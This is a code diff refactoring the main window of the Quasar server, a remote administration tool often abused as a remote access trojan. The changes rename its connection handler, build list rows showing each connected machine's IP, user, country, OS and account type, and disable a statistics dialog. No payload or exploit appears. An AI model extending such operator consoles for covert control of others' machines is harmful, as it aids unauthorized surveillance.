@@ -17,7 +17,7 @@ namespace xServer.Forms
 {
     public partial class FrmMain : Form
     {
-        public ConnectionHandler ConServer { get; set; }
+        public ServerHandler ConServer { get; set; }
         public static FrmMain Instance { get; private set; }
 
         private const int STATUS_ID = 4;
@@ -65,8 +65,8 @@ namespace xServer.Forms
                 {
                     int selected = lstClients.SelectedItems.Count;
                     this.Text = (selected > 0) ?
-                        string.Format("Quasar - Connected: {0} [Selected: {1}]", ConServer.ConnectedAndAuthenticatedClients, selected) :
-                        string.Format("Quasar - Connected: {0}", ConServer.ConnectedAndAuthenticatedClients);
+                        string.Format("Quasar - Connected: {0} [Selected: {1}]", ConServer.ConnectedClients, selected) :
+                        string.Format("Quasar - Connected: {0}", ConServer.ConnectedClients);
                 });
             }
             catch
@@ -77,7 +77,7 @@ namespace xServer.Forms
 
         private void InitializeServer()
         {
-            ConServer = new ConnectionHandler();
+            ConServer = new ServerHandler();
 
             ConServer.ServerState += ServerState;
             ConServer.ClientConnected += ClientConnected;
@@ -127,7 +127,7 @@ namespace xServer.Forms
             UpdateWindowTitle();
         }
 
-        private void ServerState(ushort port, bool listening)
+        private void ServerState(Server server, bool listening, ushort port)
         {
             try
             {
@@ -143,7 +143,9 @@ namespace xServer.Forms
 
         private void ClientConnected(Client client)
         {
-            new Core.Packets.ServerPackets.GetAuthentication().Execute(client);
+            AddClientToListview(client, client.Value.UserAtPc, client.Value.CountryWithCode, client.Value.ImageIndex);
+            if (Settings.ShowPopup)
+                ShowPopup(client);
         }
 
         private void ClientDisconnected(Client client)
@@ -175,19 +177,29 @@ namespace xServer.Forms
         /// <summary>
         /// Adds a connected client to the Listview.
         /// </summary>
-        /// <param name="clientItem">The client to add.</param>
-        public void AddClientToListview(ListViewItem clientItem)
+        /// <param name="client">The client to add.</param>
+        /// <param name="userAtPc">User@PC string.</param>
+        /// <param name="country">The country of the client.</param>
+        /// <param name="imageIndex">The index of the country-flag image.</param>
+        private void AddClientToListview(Client client, string userAtPc, string country, int imageIndex)
         {
+            if (client == null || !client.Authenticated) return;
+
             try
             {
-                if (clientItem == null) return;
+                // this " " leaves some space between the flag-icon and first item
+                ListViewItem lvi = new ListViewItem(new string[]
+                {
+                    " " + client.EndPoint.Address, client.Value.Tag,
+                    userAtPc, client.Value.Version, "Connected", "Active", country,
+                    client.Value.OperatingSystem, client.Value.AccountType
+                }) { Tag = client, ImageIndex = imageIndex };
 
                 lstClients.Invoke((MethodInvoker) delegate
                 {
                     lock (_lockClients)
                     {
-                        lstClients.Items.Add(clientItem);
-                        ConServer.ConnectedAndAuthenticatedClients++;
+                        lstClients.Items.Add(lvi);
                     }
                 });
 
@@ -202,7 +214,7 @@ namespace xServer.Forms
         /// Removes a connected client from the Listview.
         /// </summary>
         /// <param name="c">The client to remove.</param>
-        public void RemoveClientFromListview(Client c)
+        private void RemoveClientFromListview(Client c)
         {
             try
             {
@@ -214,7 +226,6 @@ namespace xServer.Forms
                             .Where(lvi => lvi != null && (lvi.Tag as Client) != null && c.Equals((Client) lvi.Tag)))
                         {
                             lvi.Remove();
-                            ConServer.ConnectedAndAuthenticatedClients--;
                             break;
                         }
                     }
@@ -316,7 +327,7 @@ namespace xServer.Forms
         /// Displays a popup with information about a client.
         /// </summary>
         /// <param name="c">The client.</param>
-        public void ShowPopup(Client c)
+        private void ShowPopup(Client c)
         {
             try
             {
@@ -762,18 +773,18 @@ namespace xServer.Forms
 
         private void menuStatistics_Click(object sender, EventArgs e)
         {
-            if (ConServer.BytesReceived == 0 || ConServer.BytesSent == 0)
-                MessageBox.Show("Statistics makes no sense when no data is available.\nPlease wait for at least one connected Client!", "Not available", MessageBoxButtons.OK,
-                    MessageBoxIcon.Information);
-            else
-            {
-                using (
-                    var frm = new FrmStatistics(ConServer.BytesReceived, ConServer.BytesSent,
-                        ConServer.ConnectedAndAuthenticatedClients, ConServer.AllTimeConnectedClientsCount))
-                {
-                    frm.ShowDialog();
-                }
-            }
+            //if (ConServer.BytesReceived == 0 || ConServer.BytesSent == 0)
+            //    MessageBox.Show("Statistics makes no sense when no data is available.\nPlease wait for at least one connected Client!", "Not available", MessageBoxButtons.OK,
+            //        MessageBoxIcon.Information);
+            //else
+            //{
+            //    using (
+            //        var frm = new FrmStatistics(ConServer.BytesReceived, ConServer.BytesSent,
+            //            ConServer.ConnectedAndAuthenticatedClients, ConServer.AllTimeConnectedClientsCount))
+            //    {
+            //        frm.ShowDialog();
+            //    }
+            //}
         }
 
         private void menuAbout_Click(object sender, EventArgs e)
